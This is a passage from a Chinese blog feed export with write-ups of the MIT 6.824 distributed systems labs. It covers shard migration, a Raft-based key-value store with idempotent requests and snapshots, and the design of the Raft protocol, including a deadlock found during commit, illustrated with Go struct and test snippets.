<p>基于之前的讨论，可以设计出这样的结构体。server 需要记录最新的 config 和上一个 config，并持久化到快照里，用于重启后知晓自己是否处在配置更新中。这里用指针其实更合适一点，配置更新中等价于 <code>prevConfig!=nil</code>，但是 gob 不能处理空指针的序列化，就很坏。</p>
<p>有了两个 config 之后，要怎么使用呢：</p>
<ul>
<li>配置更新开始时，设置 <code>prevConfig=currentConfig ; currentConfig=op.Config</code></li>
<li>更新完毕后，设置 <code>prevConfig.Num=0</code>，配置更新中 &lt;=&gt;<code>prevConfig.Num!=0</code></li>
<li>根据 <code>prevConfig.Shards</code> 和 <code>currentConfig.Shards</code>，计算需要拉取、删除的 shard</li>
<li> 拉取删除数据时，要依赖 <code>prevConfig.Groups</code> 找到对应的 <code>endname</code> 发起请求</li>
<li>当成功删除某个 shard 后，更新 <code>prevConfig.Shards[shard]=currentConfig.Shards[shard]</code>，唤醒更新线程，再次检查是否存在需要等待删除的 shard</li>
</ul>
<p>注意，<strong>在插入 shard 数据后，不能更新 config</strong>！！！不然会有重启后，切片数据删除不掉的问题，假设存在下面的配置更新：</p>
<ul>
<li>[100,100]-&gt;[101,101]</li>
<li>101 拿到并 apply 切片 0,1 之后，发起删除切片之前，宕机了</li>
<li> 101 新选举出 leader 后，发现自己没有需要拉取的数据了（因为 config 已经更新过了），也没有需要删除的数据，直接更新结束了</li>
<li> 100 一直干巴巴地等着数据删除的请求，但那永远不会到来了...</li>
</ul>
<h3 id="challenge-2-不阻塞其他切片数据请求">challenge 2 不阻塞其他切片数据请求</h3>
<p>要求即使在配置更新中，如果请求的数据不处于切片迁移中，应该正常处理，不能阻塞。</p>
<p>这就需要我们检查单个切片的迁移状态，且 apply 配置更新时不能阻塞 applier 线程。我这里使用了一个 <code>inMigration map[int]bool</code>，记录哪些切片是还没有拉取到的，该字段同样需要存储在快照中。</p>
<ol type="1">
<li>在配置更新开始的时候，根据 <code>prevConfig,cuurentConfig</code> 计算 <code>inMigration</code></li>
<li>apply 一条 Insert ShardOp，<strong>如果在 <code>inMigration</code> 中，应用 op 且从 <code>inMigration</code> 中删除</strong></li>
<li>用户请求到来时，根据 <code>inMigration</code> 判断是否阻塞</li>
</ol>
<p>究其原因是，不能在 Insert ShardOp 更新 <code>prevConfig</code> 后，就缺少了实时反映数据同步进度的状态，就有了 <code>inMigration</code>。</p>
<h3 id="challenge-2-快速响应">challenge 2 快速响应</h3>
<p>要求在配置更新中，在收到部分 shard 数据后，应该立刻开始处理请求，不能等到配置更新结束再处理。在测试代码中，可以看到，持有旧切片的复制组直接下线了，这种情况下配置更新永远无法完成，没有快速响应，系统就永远无法处理用户请求。</p>
<p>这里需要注意的就是上面高亮的步骤 2，需要加幂等性校验。因为可能 server 执行了一些这个切片的数据更新后，在配置更新中下线了，之后重启，由重新拉取了一份旧数据，如果直接覆盖，就会导致更新丢失。</p>
<h2 id="总结">总结</h2>
<p>这门分布式系统的课程，一路学来、做实验，让我收获很多。在不可靠的网络中（分区、丢失、乱序），能够实现一个分区容错、强一致的分布式系统，还是很有成功感的。</p>
<p>由于时间限制，这篇博客没有写的很详细，但还是希望这篇博客能帮到你，有问题也可以评论交流～</p>
]]></content>
      <categories>
        <category>MIT 6.824</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
        <tag>MIT 6.824</tag>
        <tag>Raft</tag>
        <tag>KV</tag>
        <tag>切片</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT-6.824 Lab3: 基于 Raft 的 KV 数据库</title>
    <url>/blog/2023/07/29/MIT-6-824-3/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本篇是 MIT 6.824 的 lab3，基于之前构建的 Raft 层的容错、线性一致性的能力，实现一个 KV 数据库。</p>
<span id="more"></span>
<p>遵循课程规定，本文没有放出核心代码，只介绍了一些结构设计和流程思考，可放心食用。</p>
<h2 id="整体架构">整体架构</h2>
<p>KV 数据库是典型的客户端 - 服务端架构，结构图如下（来自官网）：</p>
<p><img src="kvraft_diagram.png"></p>
<ul>
<li>客户端：GET/PUT/APPEND 请求的发起者，期望得到一个<strong>线性一致的结果</strong></li>
<li>服务端：基于 Raft 的分布式存储，屏蔽了内部细节，对外表现的像是一个<strong>可靠的单机存储</strong></li>
</ul>
<p>这里的线性一致是指，多个客户端发起请求时，某个客户端得到的结果，对其他客户端是立刻可见的。比如客户端 A 发起了 <code>put x 1</code>，只要它得到了正确处理的结果，任何其他客户端发起 <code>get x</code> 得到的一定是 1。这是通俗一点的解释方法。来自维基百科的，更学术一点的定义：</p>
<blockquote>
<p>In <a href="https://en.wikipedia.org/wiki/Concurrent_programming">concurrent programming</a>, an operation (or set of operations) is <strong>linearizable</strong> if it consists of an ordered list of <a href="https://en.wikipedia.org/wiki/Execution_(computing)">invocation</a> and response <a href="https://en.wikipedia.org/wiki/Event_(computing)">events</a>, that may be extended by adding response events such that:</p>
<ol type="1">
<li>The extended list can be re-expressed as a sequential history (is <a href="https://en.wikipedia.org/wiki/Serializability">serializable</a>).</li>
<li>That sequential history is a subset of the original unextended list.</li>
</ol>
</blockquote>
<p>也可以参考<a href="https://segmentfault.com/a/1190000022248118">分布式 - 共识、线性一致性与顺序一致性 - 叽叽喳喳 - SegmentFault 思否</a>。</p>
<p>二者之前的通信基于 RPC：</p>
<ul>
<li>客户端 API：GET/PUT/APPEND 方法，反复重试<strong>直到找到对应的服务端 leader 节点</strong>，发起请求</li>
<li>服务端逻辑：如果不是 leader，返回报错，否则<strong>阻塞到请求成功执行，返回执行结果</strong></li>
</ul>
<h3 id="需要考虑的问题">需要考虑的问题</h3>
<p><strong>重复请求的幂等性</strong>：由于网络不稳定，可能会有应用层的重发，客户端需要给请求带唯一 id，服务端需要做幂等处理</p>
<ul>
<li>注意，这个要和 TCP 的 “不重不漏” 区分开。假设传输层使用 TCP 协议，也只能保证应用层的报文被正常接收（应答方返回 ACK），并不能对应用层的逻辑作任何保证，必须得收到应用层的响应才能认为请求得到处理，收不到就需要重发。</li>
</ul>
<h2 id="客户端">客户端</h2>
<p>客户端的逻辑比较清晰，需要缓存一个 <code>leaderId</code> 记录上次成功处理请求的 server，避免每次都要轮询所有 server。为了支持幂等性，需要有客户端 id、序列号 id 两个字段，唯一标识一个客户端请求。对应地、服务端需要保存<strong>每个客户端处理过的最大请求 id</strong>，在处理前先确认没有处理过，进而实现幂等性。</p>
<p>在这种场景下，要求每个客户端只能<strong>以单线程地阻塞发起请求</strong>，才可以保证幂等性。反之，如果客户端 0 同时发起了 1、2 两个请求，2 被正确处理了，1 丢失没有到达 server。等 1 的重传报文到达 server，server 发现处理完的最大请求 id 是 2&gt;1，进而拒绝处理，就出问题了。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Clerk <span class="keyword">struct</span> {</span><br><span class="line"> servers []*labrpc.ClientEnd</span><br><span class="line"> <span class="comment">// You will have to modify this struct.</span></span><br><span class="line"> leaderId <span class="keyword">int</span>   <span class="comment">// leader id (client 的角度)</span></span><br><span class="line"> id       <span class="keyword">int64</span> <span class="comment">// clerk uuid</span></span><br><span class="line"> seqId    <span class="keyword">int64</span> <span class="comment">// 从 1 开始自增的请求Id</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这里需要注意的一点是，客户端和服务端的角度来看<strong>，<code>servers</code> 的顺序是不一致的</strong>。我最开始想做的一个优化是，server 在收到请求，发现自己不是 leader 之后，把正确 server 的 id 发给客户端，客户端直接向对应的 id 发请求，不必轮询所有 server，实际运行的时候却出现了问题。观察代码可以发现，测试中新建客户端时，做了乱序处理：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">ck := MakeClerk(random_handles(ends))</span><br></pre></td></tr></tbody></table></figure>
<p>这样的设计进一步解耦了 client 和 server，在真实系统里，client 和 server 的访问策略和机制可能是不一致的，两者间不应该产生依赖。</p>
<p>这里有个坑点是，key 不存在的时候，client 应该返回空字符串，我最开始返回了 <code>ErrNoKey</code>，报了奇怪的线性不一致问题，对着 procupine 的图反复研究，有点乐。</p>
<h2 id="服务端">服务端</h2>
<h3 id="结构">结构</h3>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> KVServer <span class="keyword">struct</span> {</span><br><span class="line"> deadlock.Mutex</span><br><span class="line"> me      <span class="keyword">int</span></span><br><span class="line"> rf      *raft.Raft</span><br><span class="line"> applyCh <span class="keyword">chan</span> raft.ApplyMsg</span><br><span class="line"> dead    <span class="keyword">int32</span> <span class="comment">// set by Kill()</span></span><br><span class="line"></span><br><span class="line"> maxraftstate <span class="keyword">int</span> <span class="comment">// snapshot if log grows this big</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// Your definitions here.</span></span><br><span class="line"> <span class="comment">// kv</span></span><br><span class="line"> maxRaftSize <span class="keyword">int</span>               <span class="comment">// Raft 最大状态</span></span><br><span class="line"> db          <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span> <span class="comment">// 数据存储</span></span><br><span class="line"> seen        <span class="keyword">map</span>[<span class="keyword">int64</span>]<span class="keyword">int64</span>   <span class="comment">// client对应的max Seq</span></span><br><span class="line"> <span class="comment">// 维护提交状态</span></span><br><span class="line"> lastApplied <span class="keyword">int</span>            <span class="comment">// 最后提交的 log id</span></span><br><span class="line"> applyCond   *deadlock.Cond <span class="comment">// apply 条件</span></span><br><span class="line"> <span class="comment">// persistence</span></span><br><span class="line"> persister *raft.Persister</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>服务端的逻辑如下，当接收到一个 PUT/GET/APPEND 请求：</p>
<ol type="1">
<li>判断自己是否是 leader，若否，返回错误</li>
<li>将请求提交给 raft</li>
<li> 等待 raft 将请求提交至应用层，执行完毕 / <strong>raft 的 leader 情况发生变化</strong></li>
<li>返回结果</li>
</ol>
<h3 id="处理raft-leader变化">处理 raft leader 变化</h3>
<p>需要注意的是，在等待 raft 提交请求的过程中，可能会 leader 情况发生变化，这种情况要返回错误。处理不当可能会有问题。例如，我最初是这样等待请求处理完毕的：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">index, _, isLeader := kv.rf.Start(op)</span><br><span class="line"><span class="keyword">for</span> isLeader &amp;&amp; kv.lastApplied &lt; index {</span><br><span class="line">    kv.applyCond.Wait()</span><br><span class="line">}</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></tbody></table></figure>
<p>这样没有处理 leader 变化的情况，指导书里提到可以这样处理，当节点检查到一个不同的请求已经出现在 Start 返回的 <code>index</code> 位置，即比较两个的请求内容是否相同，若不同，则说明其他节点成为了 leader，同步了不一样的日志过来。</p>
<p>我觉得这种做法可以改进，这种做法需要等待：</p>
<ol type="1">
<li>当前节点收到更大的 term，变为 follower</li>
<li> 当前节点收到 leader 的 index 日志</li>
<li>当前节点提交 index 日志至应用层</li>
</ol>
<p>之后，才会意识到自己不是 leader 了。但实际上，早在第一步就可以发现错误了。可以当 Raft 的 leader 状态发生变化时，提交一条特殊的日志到应用层，触发检查，即可及早返回错误。</p>
<h3 id="幂等性">幂等性</h3>
<p>当 server 处理请求之前，需要先判断 seqId 是否大于已处理同一 client 的最大 seqId：</p>
<ul>
<li>若是，则处理请求，更新最大 id</li>
<li> 若否，丢弃请求</li>
</ul>
<h3 id="快照">快照</h3>
<p>在 lab 2 中，raft 层实现了快照功能，本次需要在应用层对 raft 的状态进行判断，即将到达要求时，在应用层生成快照，并提交给 raft 处理。需要考虑是快照里要包含哪些信息：</p>
<ul>
<li>数据库的键值对，这个是毋庸置疑的</li>
<li>每个 client 已处理的最大请求 Id，避免重启后处理重复消息</li>
</ul>
<h2 id="一些问题">一些问题</h2>
<h3 id="operations-completed-too-slowly">Operations completed too slowly</h3>
<p>lab3 测试中可能会出现这个错，一般原因是，在 Start 中没有立刻同步日志，只有被动地依赖 Raft 心跳进行传输，使得操作处理速率受限于心跳频率。解决方法当然是，在 Start 后立刻<strong>异步</strong>同步日志。</p>
<p>细心的你会发现，Start 和心跳可能会同时同步日志，那么会不会有什么问题呢？当然是有的！问题表现的<strong>像是收到了乱序的网络回复</strong>。我们知道，<code>AppendEntries</code> 调用可能会有以下两种结果：</p>
<ul>
<li>失败，<code>leader</code> 降低 <code>nextIndex</code> 重试，可能发起 <code>InstallSnapshot</code></li>
<li>成功，<code>leader</code> 调高 <code>nextIndex, matchIndex</code></li>
</ul>
<p>假设出现了这样的执行顺序：</p>
<ol type="1">
<li>心跳线程，发起 <code>AppendEntries</code></li>
<li>Start 发起 <code>AppendEntries</code></li>
<li>心跳线程，失败，降低 <code>nextIndex</code></li>
<li>心跳线程，<code>InstallSnapshot</code> 成功，增大 <code>nextIndex &gt; lastIncludedIndex</code></li>
<li>Start 收到结果，失败，降低 <code>nextIndex</code></li>
<li>心跳线程，<code>InstallSnapshot</code> 成功后尝试同步快照后的日志，期望 <code>nextIndex &gt; lastIncludedIndex</code>，<strong>发现不符合，出错</strong></li>
</ol>
<p>当然，这个问题跟具体实现有关，我的实现中，失败后会依次完成 <code>InstallSnapshot</code>，成功后继续 <code>AppendEntries</code>，由于发起 RPC 过程中释放了锁，导致其他线程修改了 <code>nextIndex</code>，进而出错。</p>
<p>解决方法是，进行兼容处理，所有的，由于 RPC 中途释放的过程，形如：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line">rf.Lock()</span><br><span class="line">v:=rf.nextIndex</span><br><span class="line">rf.Unlock()</span><br><span class="line">server.Call()</span><br><span class="line">rf.Lock()</span><br><span class="line"><span class="comment">// should use v rather than rf.nextIndex</span></span><br><span class="line"><span class="comment">// should check v==rf.nextIndex</span></span><br><span class="line">rf.Unlock()</span><br></pre></td></tr></tbody></table></figure>
<p>在第一次加锁中，需要读取共享变量的值，第二次加锁时，需要选择：</p>
<ul>
<li>使用第一次读到的值，不要读新值，更新时要兼容更新（例如取 max）</li>
<li>检查新值旧值是否相同，再决定要不要进行剩下的逻辑</li>
</ul>
<p>具体选哪种要看操作类型，比如我上面举的例子，当应该判断新的 <code>nextIndex</code> 是否合法，不合法就退出执行。</p>
<p>此外，在接收端，即处理 <code>AppendEntries</code>，<code>InstallSnapshot</code> 时，也需要做乱序请求的兼容，不过由于处理时基本一直加锁，只需在处理前判断即可。</p>
<h3 id="心跳可以不传数据吗">心跳可以不传数据吗</h3>
<p>我不建议这样做。Start 只有在应用层新增请求的时候会使用。如果心跳不传数据，可能会导致日志同步过慢。例如 leader 收到新日志 1 后，还没同步到过半节点，宕机了。新 leader 上线后，由于应用层迟迟没有新请求到来，日志 1 迟迟得不到同步，也不好。如果心跳也可以同步日志，就可以保证了一个最低同步时延。</p>
<h3 id="start怎么同步日志">Start 怎么同步日志</h3>
<p>我建议不要每次都起 goroutine，而是为每个 peer 维护一个后台同步线程，Start 只是唤醒这个线程执行。虽然 goroutine 创建和销毁的开销不大，但是，频繁 Start 场景下，每次 Start 都会开启 n 个 goroutine，这：</p>
<ul>
<li>不必要：如果前一个日志同步没有得到响应（可能节点下线），发起新的同步意义不大</li>
<li>存在重复传输：前一个日志同步没有得到响应，每次新的同步都会带有 <code>nextIndex</code> 之后的全量日志，有很多是重复的</li>
<li>存在锁的争用和潜在的并发问题</li>
</ul>
<h2 id="总结">总结</h2>
<p>本次 lab 整体不难，就是可能 Raft 有些问题，需要再返回去排查改错。如果 Raft 模块设计的不好，再回过头改动会很痛苦。</p>
]]></content>
      <categories>
        <category>MIT 6.824</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
        <tag>MIT 6.824</tag>
        <tag>Raft</tag>
        <tag>KV</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT 6.824 Lab2 实验报告: Raft</title>
    <url>/blog/2023/07/17/MIT-6-824-2/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本篇是 MIT 6.824 Lab2 的实验报告，用 Golang 实现 Raft 强一致性协议，包含 leader 选举、日志同步、持久化、日志快重传、日志压缩几部分内容。</p>
<span id="more"></span>
<p>遵循课程规定，本文没有放出核心代码，只介绍了一些结构设计和流程思考，可放心食用。</p>
<h2 id="理论知识">理论知识</h2>
<h3 id="raft简介">Raft 简介</h3>
<p>Raft 是一种基于<mark style="background: #FFB86CA6;">过半票决</mark>（Majority Vote）的分布式共识算法。过半票决是指，对于某个决定（例如选举谁做 Leader），只有当超过半数以上的节点都投票同意，才会生效。这里的半数是指所有节点中的半数（包括已经宕机、下线的节点）。一般设置服务器数量为奇数，因为偶数多的一台服务器是没有意义的。通常来说，<code>2n+1</code> 个节点可以最多容忍 <code>n</code> 个节点下线。</p>
<p>Raft 中，存在三种角色：Leader（至多一个）、Candidate、Follower。Leader 会接收应用请求，产生日志，将日志同步给 Follwer，当 Leader 发现超过半数的节点都正确接收了日志，就可以想应用层提交日志。</p>
<p>Raft 中，Leader 是以任期（term）为单位存在的。每个任期中至多只会有一个 leader，Leader 会通过心跳与 Follower 保持沟通。初始时，所有节点均为 Follower，每个 Follower 有一个选举计时器，当收到 leader 信息后会将其重置。若 follower 的选举计时器超时，则会将任期 + 1，开始一次 leader 选举，将自身的日志更新情况和任期等信息发送给其他节点，由它们投出赞成 / 反对票。若某个 follower 获取了超半数的赞成票，则它会成为 leader。</p>
<h3 id="过半票决">过半票决</h3>
<p>过半票决可以避免脑裂。即使网络存在分区，也<strong>必然不可能有超过一个分区拥有过半数量的服务器</strong>，进而可以保证 leader 只有一个。这里背后更微妙的点在于，如果你<strong>总是需要过半的服务器才能完成任何操作</strong>，同时你有一系列的操作需要完成，其中的每一个操作都需要过半的服务器来批准，例如选举 Raft 的 Leader，那么<strong>每一个操作对应的过半服务器，必然至少包含一个服务器存在于上一个操作的过半服务器中</strong>。也就是说，任意两组过半服务器，至少有一个服务器是重叠的。实际上，相比其他特性，Raft 更依赖这个特性来避免脑裂。</p>
<blockquote>
<p>这里可以用反证法思考。如果两组过半服务器，不重叠，交集为空，所以它们的并集节点数 &gt; N，即不重复的节点数量大于 N，就有矛盾了</p>
</blockquote>
<p>例如，当一个 Raft Leader 竞选成功，那么这个 Leader 必然凑够了过半服务器的选票，而这组过半服务器中，必然与旧 Leader 的过半服务器有重叠。所以，<mark style="background: #FFB86CA6;">新的 Leader 必然知道旧 Leader 使用的任期号</mark>（term number），因为<strong>新 Leader 的过半服务器必然与旧 Leader 的过半服务器有重叠</strong>，而旧 Leader 的过半服务器中的每一个必然都知道旧 Leader 的任期号。类似的，<strong>任何旧 Leader 提交的操作，必然存在于过半的 Raft 服务器中</strong>，而任何新 Leader 的过半服务器中，必然有至少一个服务器包含了旧 Leader 的所有操作。这是 Raft 能正确运行的一个重要因素。</p>
<h3 id="日志">日志</h3>
<p>在 Raft 中，每个应用请求都会关联创建一条日志（Log）。为什么要有日志？有以下几个原因：</p>
<ul>
<li><strong>日志是 Leader 用来对操作排序的一种手段</strong>，这使得应用层的操作可以以某种正确的逻辑串行执行</li>
<li><strong>日志用来存放临时操作</strong>。Follower 收到了这些临时的操作，但是还不确定这些操作是否被 commit 了，只有当超过半数以上节点都收到，才会 commit，否则会丢弃</li>
<li><strong>日志可以用来持久化</strong>。Leader 需要在它的日志中记录操作，因为这些操作可能需要重传给 Follower，用于恢复状态</li>
</ul>
<h3 id="日志压缩">日志压缩</h3>
<p>在 Raft 中，Log 压缩和快照解决的问题是：对于一个长期运行的系统，例如运行了几周，几个月甚至几年， Log 会持续增长。最后可能会有数百万条 Log，从而需要大量的内存来存储。如果持久化存储在磁盘上，最终会消耗磁盘的大量空间。如果一个服务器重启了，它需要通过重新从头开始执行这数百万条 Log 来重建自己的状态。当故障重启之后，遍历并执行整个 Log 的内容可能要花费几个小时来完成。这在某种程度上来说是浪费，因为在重启之前，服务器已经有了一定的应用程序状态。</p>
<p>所以，当 Raft 认为它的 Log 将会过于庞大，例如大于 1MB，10MB 或者任意的限制，Raft 会要求应用程序在 Log 的特定位置，对其状态做一个快照。所以，如果 Raft 要求应用程序做一个快照，Raft 会从 Log 中选取一个与快照对应的点，然后要求应用程序在那个点的位置做一个快照，并丢弃这个点之前的日志。</p>
<h2 id="整体设计">整体设计</h2>
<p>本人的代码经过了一百多次测试，没有任何问题，下面我先介绍一下我的整体设计，供读者参考。</p>
<p>首先介绍一下 <code>Raft</code> 结构体。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Raft <span class="keyword">struct</span> {</span><br><span class="line">	sync.Mutex                     <span class="comment">// Lock to protect shared access to this peer's state</span></span><br><span class="line">	peers      []*labrpc.ClientEnd <span class="comment">// RPC end points of all peers</span></span><br><span class="line">	persister  *Persister          <span class="comment">// Object to hold this peer's persisted state</span></span><br><span class="line">	me         <span class="keyword">int</span>                 <span class="comment">// this peer's index into peers[]</span></span><br><span class="line">	dead       <span class="keyword">int32</span>               <span class="comment">// set by Kill()</span></span><br><span class="line">	<span class="comment">// common properties</span></span><br><span class="line">	applyCh <span class="keyword">chan</span> ApplyMsg</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// leader election</span></span><br><span class="line">	role               <span class="keyword">int8</span></span><br><span class="line">	lastLeaderBeatTime time.Time</span><br><span class="line">	electionTimeout    time.Duration</span><br><span class="line">	electionCond       *sync.Cond</span><br><span class="line">	<span class="comment">// Persistent state</span></span><br><span class="line">	currentTerm       <span class="keyword">int</span>        <span class="comment">// 当前 Term ID（初值为 0）</span></span><br><span class="line">	votedFor          <span class="keyword">int</span>        <span class="comment">// 该 Term 中已接收到来自该节点的选票的 Candidate ID</span></span><br><span class="line">	logs              []LogEntry <span class="comment">// 日志记录。第一个日志记录的 index 值为 1</span></span><br><span class="line">	lastIncludedIndex <span class="keyword">int</span>        <span class="comment">// 日志的快照偏移，初始为0，也相当于已经在快照中的最大日志索引，可以用来判断日志进度</span></span><br><span class="line">	lastIncludedTerm  <span class="keyword">int</span>        <span class="comment">// lastIncludedIndex 对应的term</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// all-server volatile states</span></span><br><span class="line">	commitIndex <span class="keyword">int</span> <span class="comment">// 最后一个已提交日志记录的 index（初值为 0）</span></span><br><span class="line">	lastApplied <span class="keyword">int</span> <span class="comment">// 最后一个已应用至上层状态机的日志记录的 index（初值为 0）</span></span><br><span class="line">	commitCond  *sync.Cond</span><br><span class="line">	<span class="comment">// leader volatile states</span></span><br><span class="line">	nextIndex  []<span class="keyword">int</span> <span class="comment">// 每个节点即将为其发送的下一个日志记录的 index（初值均为 Leader 最新日志记录 index 值 + 1）</span></span><br><span class="line">	matchIndex []<span class="keyword">int</span> <span class="comment">// 每个节点上已备份的最后一条日志记录的 index（初值均为 0）</span></span><br><span class="line">	<span class="comment">// service persistence</span></span><br><span class="line">	snapshot []<span class="keyword">byte</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>里面的内容是随着每次 lab 填充的，逐步增加功能即可。宏观上看，结构体内需要存储以下信息：</p>
<ul>
<li>leader 选举的信息：节点的角色、选举计时器、超时时间等</li>
<li>需要持久化的重要信息：任期、投票对象、日志、快照等</li>
<li>提交信息：记录提交日志索引、上传应用层日志索引</li>
<li> leader 记录 follower 的信息：记录每个节点的下一个发送的日志索引、匹配的日志索引</li>
</ul>
<h3 id="goroutine">goroutine</h3>
<p>除了处理 RPC 的线程外，一个服务器节点要常驻几个后台线程呢？在我的设计里，是三个：</p>
<ul>
<li>ticker：维护选举定时器，超时后发起选举</li>
<li> leaderHeartBeat：若当前节点是 leader，定期心跳、同步日志</li>
<li> asyncCommit：当 <code>commitIndex&gt;lastApplied</code> 时，向应用层逐个提交日志</li>
</ul>
<p>下面，我将逐个介绍。</p>
<h3 id="ticker">ticker</h3>
<p>ticker 单独启动一个线程应该是毋庸置疑的，问题在于如何设计选举定时器呢。在我的设计里，选举定时器由两部分组成：</p>
<ul>
<li>起始时间：从什么时候开始计时，对应 <code>lastLeaderBeatTime</code></li>
<li>超时时间：超过多久判定超时，对应 <code>electionTimeout</code></li>
</ul>
<p>ticker 会检查当前时间是否超过 <code>lastLeaderBeatTime+electionTimeout</code>，若是，则起一个<strong>异步线程</strong>开始选举。</p>
<h3 id="leaderheartbeat">leaderHeartBeat</h3>
<p>leader 用来维护心跳和同步日志的线程。如果要做的精细一点，可以通过 <code>sync.Cond</code> 等到当前节点成为 leader 后再唤醒，或者粗暴一点直接 <code>sleep</code> 重试就好了。</p>
<h3 id="asynccommit">asyncCommit</h3>
<p>这个是有必要讲一下的。为什么要异步提交？因为我在做 2D 快照实验的时候发现了一个死锁的问题。当时我使用的是同步提交，逻辑示例如下：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rf *Raft)</span> <span class="title">AppendEntries</span><span class="params">(args *AppendEntriesRequest, reply *AppendEntriesReply)</span></span> {</span><br><span class="line">    rf.Lock()</span><br><span class="line">    <span class="keyword">defer</span> rf.Unlock()</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// for log in toCommit</span></span><br><span class="line">    <span class="comment">// do</span></span><br><span class="line">    <span class="comment">// 	   rf.applyCh &lt;- log</span></span><br><span class="line">    <span class="comment">// done</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>为了保证日志的串行提交，整个提交过程中是加锁同步的。在 2D 实验里，创建快照的过程示例如下：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rf *Raft)</span> <span class="title">Snapshot</span><span class="params">(index <span class="keyword">int</span>, snapshot []<span class="keyword">byte</span>)</span></span> {</span><br><span class="line">    rf.Lock()</span><br><span class="line">    <span class="keyword">defer</span> rf.Unlock()</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// truncate rf.logs</span></span><br><span class="line">    rf.lastIncludedIndex = index</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这个过程中涉及到读写共享变量，也是加锁的，没有问题。</p>
<p>如果这么写的话，问题就来了，在 2D 里就会发现一个节点日志提交的好好的，突然就没信了，到最后只剩下一个节点在打印日志。加一些调试日志后会发现，出现了死锁，问题的根源在于测试的这一段代码（精简了部分逻辑）：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(cfg *config)</span> <span class="title">applierSnap</span><span class="params">(i <span class="keyword">int</span>, applyCh <span class="keyword">chan</span> ApplyMsg)</span></span> {</span><br><span class="line">	cfg.mu.Lock()</span><br><span class="line">	rf := cfg.rafts[i]</span><br><span class="line">	cfg.mu.Unlock()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> m := <span class="keyword">range</span> applyCh {</span><br><span class="line">		<span class="keyword">if</span> m.SnapshotValid {</span><br><span class="line">			cfg.mu.Lock()</span><br><span class="line">			err_msg = cfg.ingestSnap(i, m.Snapshot, m.SnapshotIndex)</span><br><span class="line">			cfg.mu.Unlock()</span><br><span class="line">		} <span class="keyword">else</span> <span class="keyword">if</span> m.CommandValid {</span><br><span class="line">			<span class="keyword">if</span> m.CommandIndex != cfg.lastApplied[i]+<span class="number">1</span> {</span><br><span class="line">				err_msg = fmt.Sprintf(<span class="string">"server %v apply out of order, expected index %v, got %v"</span>, i, cfg.lastApplied[i]+<span class="number">1</span>, m.CommandIndex)</span><br><span class="line">			}</span><br><span class="line">			<span class="keyword">if</span> (m.CommandIndex+<span class="number">1</span>)%SnapShotInterval == <span class="number">0</span> { <span class="comment">// 看这里！！！！</span></span><br><span class="line">				w := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">				<span class="comment">// ...</span></span><br><span class="line">				rf.Snapshot(m.CommandIndex, w.Bytes())</span><br><span class="line">			}</span><br><span class="line">		} </span><br><span class="line">	</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这里的 <code>applyCh</code> 即是应用层的 <code>channel</code>，raft 启动节点时，会启动一个线程执行这个函数，读取日志消息，根据类型进行处理。那么好，问题就来了。观察注释处，可以发现，<strong>生成快照和接收应用层消息，使用的是同一个 goroutine</strong>。当同步提交的过程中，如果触发了创建快照，就会<strong>停止接收 raft 日志，进而阻塞住同步提交</strong>。</p>
<p>不幸的是，同步提交线程持有了 raft 的锁，这使得创建快照的线程一直阻塞在这个锁上，<strong>进而陷入死锁</strong>。</p>
<p>粗暴一点解决，提交日志这个过程可以异步化。每次要提交时，先加锁读取状态，创建一个 goroutine 在后台提交，逻辑示意如下：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(rf *Raft)</span> <span class="title">AppendEntries</span><span class="params">(args *AppendEntriesRequest, reply *AppendEntriesReply)</span></span> {</span><br><span class="line">    rf.Lock()</span><br><span class="line">    <span class="keyword">defer</span> rf.Unlock()</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span>{</span><br><span class="line">        <span class="comment">// for log in toCommit</span></span><br><span class="line">        <span class="comment">// do</span></span><br><span class="line">        <span class="comment">// 	   rf.applyCh &lt;- log</span></span><br><span class="line">        <span class="comment">// done</span></span><br><span class="line">    }()</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>看起来好像解决了问题，执行可能也不会出现问题，但是这段代码是有问题的。问题在于<strong>要多次提交时，无法严格保证顺序</strong>。如果有两个密集的 <code>AppendEntries</code> 到来，都要求提交日志，<strong>最后应用层收到的日志可能是交替的结果</strong>。在实验中，有要求心跳不能过于频繁，因此可能不会暴露出问题。</p>
